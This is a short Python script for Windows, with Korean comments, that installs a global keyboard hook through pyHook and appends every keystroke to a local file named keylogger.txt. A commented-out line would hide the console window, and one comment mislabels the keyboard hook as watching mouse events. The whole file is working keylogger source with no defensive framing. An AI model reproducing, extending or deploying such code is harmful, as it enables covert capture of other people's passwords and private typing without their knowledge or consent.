
import pythoncom, pyHook
import win32api 
import win32console 
import win32gui 

win=win32console.GetConsoleWindow()
# win32gui.ShowWindow(win,0)

def OnKeyboardEvent(event):
    buffer = ''
    print ('Ascii:', event.Ascii, chr(event.Ascii))
    print ('Key:', event.Key)
    print ('---')

    if event.Ascii !=8: # backspace 제외
        f = open('C:/Users/KANG/Desktop/소공전/keylogger.txt', mode = 'a+t')
        keylogs = chr(event.Ascii) 
        if event.Ascii == 13: # enter 입력
            keylogs = '\n'
        buffer += keylogs 
        f.write(buffer)
        f.close()

# return True to pass the event to other handlers
    return True

# create a hook manager
hm = pyHook.HookManager()
# watch for all mouse events
hm.KeyDown = OnKeyboardEvent
# set the hook
hm.HookKeyboard()
# wait forever
pythoncom.PumpMessages()